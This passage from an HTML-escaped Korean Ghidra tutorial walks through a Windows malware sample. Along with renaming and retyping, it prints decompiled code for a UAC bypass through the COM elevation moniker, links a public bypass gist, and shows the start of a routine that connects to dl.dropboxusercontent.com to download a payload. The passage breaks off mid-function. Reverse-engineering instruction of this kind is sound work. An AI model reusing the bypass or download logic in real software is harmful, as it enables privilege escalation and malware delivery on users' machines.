+&lt;p&gt;&lt;code&gt;local_18&lt;/code&gt;&amp;#xACFC; &lt;code&gt;local_1c&lt;/code&gt;&amp;#xC758; &amp;#xC774;&amp;#xB984;&amp;#xC744; &amp;#xBCC0;&amp;#xACBD;&amp;#xD588;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &lt;code&gt;FARPROC&lt;/code&gt;&amp;#xC73C;&amp;#xB85C; &amp;#xB418;&amp;#xC5B4;&amp;#xC788;&amp;#xB294; &lt;code&gt;CoInitializeEx_addr&lt;/code&gt;&amp;#xC740; &lt;code&gt;CoInitializeEx&lt;/code&gt;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xB2F4;&amp;#xACE0; &amp;#xC788;&amp;#xC73C;&amp;#xB2C8;, &amp;#xB370;&amp;#xC774;&amp;#xD130; &amp;#xD0C0;&amp;#xC785;&amp;#xC744; &lt;code&gt;CoInitializeEx *&lt;/code&gt;&amp;#xB85C; &amp;#xBC14;&amp;#xAFB8;&amp;#xC5B4;&amp;#xBCFC;&amp;#xAE4C;&amp;#xC694;?&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;CoInitializeEx_addr&lt;/code&gt;&amp;#xC5D0; &amp;#xB9C8;&amp;#xC6B0;&amp;#xC2A4; &amp;#xCEE4;&amp;#xC11C;&amp;#xB97C; &amp;#xC62C;&amp;#xB9AC;&amp;#xACE0; &amp;#xC6B0;&amp;#xD074;&amp;#xB9AD; &amp;#xD6C4; Retype Variable &amp;#xD639;&amp;#xC740; Ctrl + L&amp;#xC744; &amp;#xB204;&amp;#xB974;&amp;#xBA74; &amp;#xB2E4;&amp;#xC74C;&amp;#xACFC; &amp;#xAC19;&amp;#xC740; &amp;#xCC3D;&amp;#xC774; &amp;#xB739;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xAC70;&amp;#xAE30;&amp;#xC5D0; &amp;#xC801;&amp;#xD600;&amp;#xC788;&amp;#xB294; &lt;code&gt;FARPROC&lt;/code&gt;&amp;#xC744; &amp;#xC9C0;&amp;#xC6B0;&amp;#xACE0; &lt;code&gt;CoInitializeEx *&lt;/code&gt;&amp;#xB97C; &amp;#xC791;&amp;#xC131;&amp;#xD55C; &amp;#xD6C4; OK!&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/05/19/idioth/ghidra_part4/Untitled%206.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/05/19/idioth/ghidra_part4/Untitled%207.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&amp;#xADF8;&amp;#xB7FC; &amp;#xC704;&amp;#xC640; &amp;#xAC19;&amp;#xC774; &amp;#xD568;&amp;#xC218; &amp;#xD0C0;&amp;#xC785;&amp;#xC744; &amp;#xC124;&amp;#xC815;&amp;#xD558;&amp;#xB294; &amp;#xCC3D;&amp;#xC774; &amp;#xB739;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC6B0;&amp;#xB9AC;&amp;#xAC00; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD560; &amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xB9DE;&amp;#xC73C;&amp;#xB2C8;&amp;#xAE4C; OK &amp;#xBC84;&amp;#xD2BC;&amp;#xC744; &amp;#xB20C;&amp;#xB7EC;&amp;#xC8FC;&amp;#xBA74; &amp;#xB2E4;&amp;#xC74C;&amp;#xACFC; &amp;#xAC19;&amp;#xC774; &amp;#xBC14;&amp;#xB01D;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/05/19/idioth/ghidra_part4/Untitled%208.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&amp;#xD55C;&amp;#xB208;&amp;#xC5D0; &amp;#xBCF4;&amp;#xAE30; &amp;#xD6E8;&amp;#xC52C; &amp;#xD3B8;&amp;#xD574;&amp;#xC84C;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&amp;#xB2E4;&amp;#xB978; &amp;#xBD80;&amp;#xBD84;&amp;#xB3C4; &amp;#xC704;&amp;#xC640; &amp;#xB3D9;&amp;#xC77C;&amp;#xD558;&amp;#xAC8C; Rename, Retype&amp;#xC744; &amp;#xC9C4;&amp;#xD589;&amp;#xD55C; &amp;#xD6C4; &amp;#xD574;&amp;#xB2F9; &amp;#xD568;&amp;#xC218;&amp;#xC5D0;&amp;#xC11C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xB294; &amp;#xB2E4;&amp;#xB978; &amp;#xD568;&amp;#xC218;&amp;#xB4E4;&amp;#xC774; &amp;#xC5B4;&amp;#xB5A0;&amp;#xD55C; &amp;#xB3D9;&amp;#xC791;&amp;#xC744; &amp;#xD558;&amp;#xB294;&amp;#xC9C0; &amp;#xD655;&amp;#xC778;&amp;#xD574;&amp;#xBD05;&amp;#xC2DC;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&amp;#xBA3C;&amp;#xC800; &lt;code&gt;FUN_0040f860&lt;/code&gt;&amp;#xB97C; &amp;#xC0B4;&amp;#xD3B4;&amp;#xBD05;&amp;#xC2DC;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;FUN_0040f860&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(undefined *param_1,&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; param_2)&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
+  undefined *puVar1;
+  
+  puVar1 = param_1 + param_2;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (param_2 != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) {
+    &lt;span class=&#34;hljs-keyword&#34;&gt;do&lt;/span&gt; {
+      *param_1 = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
+      param_1 = param_1 + &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;
+    } &lt;span class=&#34;hljs-keyword&#34;&gt;while&lt;/span&gt; (puVar1 != param_1);
+  }
+  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt;;
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;#xD3EC;&amp;#xC778;&amp;#xD130;&amp;#xB97C; &amp;#xBC1B;&amp;#xC544;&amp;#xC11C; &lt;code&gt;param2&lt;/code&gt;&amp;#xB9CC;&amp;#xD07C; 0&amp;#xC73C;&amp;#xB85C; &amp;#xCD08;&amp;#xAE30;&amp;#xD654;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD574;&amp;#xB2F9; &amp;#xD568;&amp;#xC218;&amp;#xB294; &lt;code&gt;RtlSecureMemory()&lt;/code&gt;&amp;#xC640; &amp;#xB9E4;&amp;#xC6B0; &amp;#xD761;&amp;#xC0AC;&amp;#xD558;&amp;#xC8E0;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;define&lt;/span&gt; __CRT__NO_INLINE 1&lt;/span&gt;
+&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;lt;windows.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
+
+&lt;span class=&#34;hljs-function&#34;&gt;PVOID WINAPI &lt;span class=&#34;hljs-title&#34;&gt;RtlSecureZeroMemory&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(PVOID ptr,SIZE_T cnt)&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
+  &lt;span class=&#34;hljs-keyword&#34;&gt;volatile&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; *vptr = (&lt;span class=&#34;hljs-keyword&#34;&gt;volatile&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; *)ptr;
+&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;ifdef&lt;/span&gt; __x86_64&lt;/span&gt;
+  __stosb ((PBYTE)((DWORD64)vptr),&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,cnt);
+&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;while&lt;/span&gt; (cnt != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;)
+    {
+      *vptr++ = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
+      cnt--;
+    }
+&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;endif&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;/* __x86_64 */&lt;/span&gt;&lt;/span&gt;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; ptr;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;#xCD9C;&amp;#xCC98; : &lt;a href=&#34;https://github.com/Alexpux/mingw-w64/blob/master/mingw-w64-crt/intrincs/RtlSecureZeroMemory.c&#34;&gt;https://github.com/Alexpux/mingw-w64/blob/master/mingw-w64-crt/intrincs/RtlSecureZeroMemory.c&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&amp;#xD574;&amp;#xB2F9; &amp;#xD568;&amp;#xC218;&amp;#xC758; &amp;#xC774;&amp;#xB984;&amp;#xC744; &lt;code&gt;RtlSecureMemory&lt;/code&gt;&amp;#xB85C; &amp;#xD558;&amp;#xACE0; Function Signature&amp;#xB97C; &amp;#xC218;&amp;#xC815;&amp;#xD558;&amp;#xB3C4;&amp;#xB85D; &amp;#xD558;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD568;&amp;#xC218; &amp;#xC774;&amp;#xB984;&amp;#xC5D0; &amp;#xCEE4;&amp;#xC11C;&amp;#xB97C; &amp;#xC62C;&amp;#xB9B0; &amp;#xD6C4; &amp;#xC6B0;&amp;#xD074;&amp;#xB9AD; - Edit Function Signature&amp;#xB97C; &amp;#xD074;&amp;#xB9AD;&amp;#xD558;&amp;#xC5EC; &amp;#xC704;&amp;#xC758; &amp;#xC18C;&amp;#xC2A4; &amp;#xCF54;&amp;#xB4DC;&amp;#xC5D0; &amp;#xB098;&amp;#xC628; Signature&amp;#xC640; &amp;#xB3D9;&amp;#xC77C;&amp;#xD558;&amp;#xAC8C; &amp;#xC218;&amp;#xC815;&amp;#xD574;&amp;#xC90D;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/05/19/idioth/ghidra_part4/Untitled%209.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; OK&amp;#xB97C; &amp;#xD074;&amp;#xB9AD;&amp;#xD558;&amp;#xBA74;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;PVOID &lt;span class=&#34;hljs-title&#34;&gt;RtlSecureMemory&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(PVOID param_1,SIZE_T param_2)&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
+  undefined *puVar1;
+  
+  puVar1 = (undefined *)((&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)param_1 + param_2);
+  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (param_2 != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) {
+    &lt;span class=&#34;hljs-keyword&#34;&gt;do&lt;/span&gt; {
+      *(undefined *)param_1 = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
+      param_1 = (PVOID)((&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)param_1 + &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;);
+    } &lt;span class=&#34;hljs-keyword&#34;&gt;while&lt;/span&gt; (puVar1 != (undefined *)param_1);
+  }
+  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt;;
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;#xAE54;&amp;#xB054;&amp;#xD558;&amp;#xAC8C;(?) &amp;#xBC14;&amp;#xB010; &amp;#xAC83;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/05/19/idioth/ghidra_part4/Untitled%2010.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&amp;#xD558;&amp;#xD558;&amp;#xD558; &amp;#xAD1C;&amp;#xCC2E;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8;&amp;#xB7FC; &amp;#xC774;&amp;#xC81C; &amp;#xB2E4;&amp;#xC74C; &amp;#xD568;&amp;#xC218;&amp;#xC778; &lt;code&gt;FUN_00401a0f&lt;/code&gt;&amp;#xAC00; &amp;#xC5B4;&amp;#xB5A0;&amp;#xD55C; &amp;#xB3D9;&amp;#xC791;&amp;#xC744; &amp;#xD558;&amp;#xB294;&amp;#xC9C0; &amp;#xD655;&amp;#xC778;&amp;#xD574;&amp;#xBD05;&amp;#xC2DC;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/05/19/idioth/ghidra_part4/Untitled%2011.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&amp;#xC55E;&amp;#xBD80;&amp;#xBD84;&amp;#xC744; &amp;#xC77D;&amp;#xC5B4;&amp;#xBCF4;&amp;#xB2C8; &amp;#xC778;&amp;#xD130;&amp;#xB137;&amp;#xC5D0; &amp;#xC5F0;&amp;#xACB0;&amp;#xC744; &amp;#xD574;&amp;#xC11C; &amp;#xD574;&amp;#xB2F9; URL&amp;#xC5D0;&amp;#xC11C; ATAPIConfiguration&amp;#xC744; &amp;#xB2E4;&amp;#xC6B4;&amp;#xB85C;&amp;#xB4DC;&amp;#xD558;&amp;#xB294; &amp;#xD568;&amp;#xC218;&amp;#xC784;&amp;#xC744; &amp;#xC9D0;&amp;#xC791;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC77C;&amp;#xB2E8; &amp;#xD568;&amp;#xC218;&amp;#xBA85;&amp;#xC744; &lt;code&gt;download_ATAPIConfiguration&lt;/code&gt;&amp;#xC774;&amp;#xB77C;&amp;#xACE0; &amp;#xD569;&amp;#xC2DC;&amp;#xB2E4;. &amp;#xC774; &amp;#xD568;&amp;#xC218;&amp;#xC758; &amp;#xC804;&amp;#xCCB4;&amp;#xC801;&amp;#xC778; &amp;#xB3D9;&amp;#xC791; &amp;#xAE30;&amp;#xB2A5;&amp;#xC744; &amp;#xC815;&amp;#xB9AC;&amp;#xD574;&amp;#xBCF4;&amp;#xBA74;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;a href=&#34;https://gist.github.com/api0cradle/d4aaef39db0d845627d819b2b6b30512&#34;&gt;COM &amp;#xC778;&amp;#xD130;&amp;#xD398;&amp;#xC774;&amp;#xC2A4;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xC5EC; UAC&amp;#xB97C; &amp;#xC6B0;&amp;#xD68C;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&amp;#xC778;&amp;#xD130;&amp;#xB137;&amp;#xC5D0;&amp;#xC11C; ATAPIConfiguration&amp;#xC744; &amp;#xB2E4;&amp;#xC6B4;&amp;#xB85C;&amp;#xB4DC;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&amp;#xADF8;&amp;#xB7FC; &amp;#xD574;&amp;#xB2F9; &amp;#xD568;&amp;#xC218; &amp;#xC774;&amp;#xB984;&amp;#xC740; uac_bypass_and_download_file&amp;#xB85C; &amp;#xD558;&amp;#xC5EC; &amp;#xC815;&amp;#xB9AC;&amp;#xB97C; &amp;#xD558;&amp;#xBA74; &amp;#xB2E4;&amp;#xC74C;&amp;#xACFC; &amp;#xAC19;&amp;#xC740; &amp;#xCF54;&amp;#xB4DC;&amp;#xAC00; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;uac_bypass_download_file&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
+  HMODULE HModule;
+  HRESULT HVar1;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;wchar_t&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;string&lt;/span&gt; [&lt;span class=&#34;hljs-number&#34;&gt;260&lt;/span&gt;];
+  BIND_OPTS pBindOptions;
+  undefined4 local_60;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *ppv;
+  CLSID local_4c;
+  IID riid;
+  CoGetObject *CoGetObject_addr;
+  IIDFromString *IIDFromString_addr;
+  CLSIDFromString *CLSIDFromString_addr;
+  HRESULT local_20;
+  CoInitializeEx *CoInitializeEx_addr;
+  HMODULE hModule;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; local_14;
+  HRESULT local_10;
+  
+  local_10 = &lt;span class=&#34;hljs-number&#34;&gt;0x80004005&lt;/span&gt;;
+  local_14 = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
+  ppv = (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *)&lt;span class=&#34;hljs-number&#34;&gt;0x0&lt;/span&gt;;
+  hModule = LoadLibraryA(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;ole32.dll&amp;quot;&lt;/span&gt;);
+  CoInitializeEx_addr = (CoInitializeEx *)GetProcAddress(hModule,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;CoInitializeEx&amp;quot;&lt;/span&gt;);
+  local_20 = (*CoInitializeEx_addr)((LPVOID)&lt;span class=&#34;hljs-number&#34;&gt;0x0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;);
+  HModule = GetModuleHandleW(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;Ole32.dll&amp;quot;&lt;/span&gt;);
+  CLSIDFromString_addr = (CLSIDFromString *)GetProcAddress(HModule,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;CLSIDFromString&amp;quot;&lt;/span&gt;);
+  HModule = GetModuleHandleW(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;Ole32.dll&amp;quot;&lt;/span&gt;);
+  IIDFromString_addr = (IIDFromString *)GetProcAddress(HModule,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;IIDFromString&amp;quot;&lt;/span&gt;);
+  &lt;span class=&#34;hljs-keyword&#34;&gt;do&lt;/span&gt; {
+    HVar1 = (*CLSIDFromString_addr)(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;{3E5FC7F9-9A51-4367-9063-A120244FBEC7}&amp;quot;&lt;/span&gt;,(LPCLSID)&amp;amp;local_4c);
+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ((HVar1 != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) ||
+       (HVar1 = (*IIDFromString_addr)(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;{6EDD6D74-C007-4E75-B76A-E5740995E24C}&amp;quot;&lt;/span&gt;,(LPIID)&amp;amp;riid),
+       HVar1 != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;)) &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;;
+    RtlSecureZeroMemory(&lt;span class=&#34;hljs-built_in&#34;&gt;string&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0x208&lt;/span&gt;);
+    wcscpy(&lt;span class=&#34;hljs-built_in&#34;&gt;string&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;Elevation:Administrator!new:&amp;quot;&lt;/span&gt;);
+    wcscat(&lt;span class=&#34;hljs-built_in&#34;&gt;string&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;{3E5FC7F9-9A51-4367-9063-A120244FBEC7}&amp;quot;&lt;/span&gt;);
+    RtlSecureZeroMemory(&amp;amp;pBindOptions,&lt;span class=&#34;hljs-number&#34;&gt;0x24&lt;/span&gt;);
+    pBindOptions.cbStruct = &lt;span class=&#34;hljs-number&#34;&gt;0x24&lt;/span&gt;;
+    local_60 = &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;;
+    HModule = GetModuleHandleW(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;Ole32.dll&amp;quot;&lt;/span&gt;);
+    CoGetObject_addr = (CoGetObject *)GetProcAddress(HModule,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;CoGetObject&amp;quot;&lt;/span&gt;);
+    local_10 = (*CoGetObject_addr)(&lt;span class=&#34;hljs-built_in&#34;&gt;string&lt;/span&gt;,&amp;amp;pBindOptions,&amp;amp;riid,&amp;amp;ppv);
+    download_ATAPIConfiguration();
+    local_10 = (**(code **)(*ppv + &lt;span class=&#34;hljs-number&#34;&gt;0x24&lt;/span&gt;))(ppv,download_path,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;);
+  } &lt;span class=&#34;hljs-keyword&#34;&gt;while&lt;/span&gt; (local_14 != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);
+  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (ppv != (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *)&lt;span class=&#34;hljs-number&#34;&gt;0x0&lt;/span&gt;) {
+    (**(code **)(*ppv + &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;))(ppv);
+  }
+  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt;;
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;ATAPIConfiguration-&amp;#xB2E4;&amp;#xC6B4;&amp;#xB85C;&amp;#xB4DC;-&amp;#xD568;&amp;#xC218;&#34;&gt;&lt;a href=&#34;#ATAPIConfiguration-&amp;#xB2E4;&amp;#xC6B4;&amp;#xB85C;&amp;#xB4DC;-&amp;#xD568;&amp;#xC218;&#34; class=&#34;headerlink&#34; title=&#34;ATAPIConfiguration &amp;#xB2E4;&amp;#xC6B4;&amp;#xB85C;&amp;#xB4DC; &amp;#xD568;&amp;#xC218;&#34;&gt;&lt;/a&gt;ATAPIConfiguration &amp;#xB2E4;&amp;#xC6B4;&amp;#xB85C;&amp;#xB4DC; &amp;#xD568;&amp;#xC218;&lt;/h2&gt;&lt;p&gt;&amp;#xC774;&amp;#xC81C; &amp;#xC544;&amp;#xAE4C; &amp;#xC9C0;&amp;#xB098;&amp;#xCCE4;&amp;#xB358; &lt;code&gt;download_ATAPIConfiguration()&lt;/code&gt;&amp;#xC744; &amp;#xBD84;&amp;#xC11D;&amp;#xC744; &amp;#xD574;&amp;#xBD05;&amp;#xC2DC;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;undefined4 &lt;span class=&#34;hljs-title&#34;&gt;download_ATAPIConfiguration&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
+  &lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; cVar1;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;bool&lt;/span&gt; bVar2;
+  undefined4 uVar3;
+  HMODULE pHVar4;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; iVar5;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;size_t&lt;/span&gt; sVar6;
+  undefined4 *puVar7;
+  uint uVar8;
+  LPCSTR pCVar9;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; local_64;
+  undefined4 local_60;
+  undefined4 local_5c;
+  uint local_58;
+  FARPROC local_54;
+  FARPROC local_50;
+  FARPROC local_4c;
+  HANDLE local_48;
+  FARPROC local_44;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; *local_40;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; *local_3c;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; local_38;
+  FARPROC local_34;
+  FARPROC local_30;
+  FARPROC local_2c;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; local_28;
+  FARPROC local_24;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; local_20;
+  FARPROC local_1c;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; local_18;
+  FARPROC local_14;
+  HMODULE local_10;
+  
+  local_10 = LoadLibraryA(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;wininet.dll&amp;quot;&lt;/span&gt;);
+  local_14 = GetProcAddress(local_10,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;InternetOpenW&amp;quot;&lt;/span&gt;);
+  local_18 = (*local_14)(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;WINDOWS&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);
+  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (local_18 == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) {
+    uVar3 = &lt;span class=&#34;hljs-number&#34;&gt;0xe&lt;/span&gt;;
+  }
+  &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; {
+    pHVar4 = GetModuleHandleW(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;wininet.dll&amp;quot;&lt;/span&gt;);
+    local_1c = GetProcAddress(pHVar4,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;InternetConnectW&amp;quot;&lt;/span&gt;);
+    local_20 = (*local_1c)(local_18,&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;dl.dropboxusercontent.com&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0x1bb&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;);
+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (local_20 == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) {
+      uVar3 = &lt;span class=&#34;hljs-number&#34;&gt;0xe&lt;/span&gt;;
+    }
+    &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; {
+      pHVar4 = GetModuleHandleW(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;wininet.dll&amp;quot;&lt;/span&gt;);
+      local_24 = GetProcAddress(pHVar4,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;HttpOpenRequestW&amp;quot;&lt;/span&gt;);
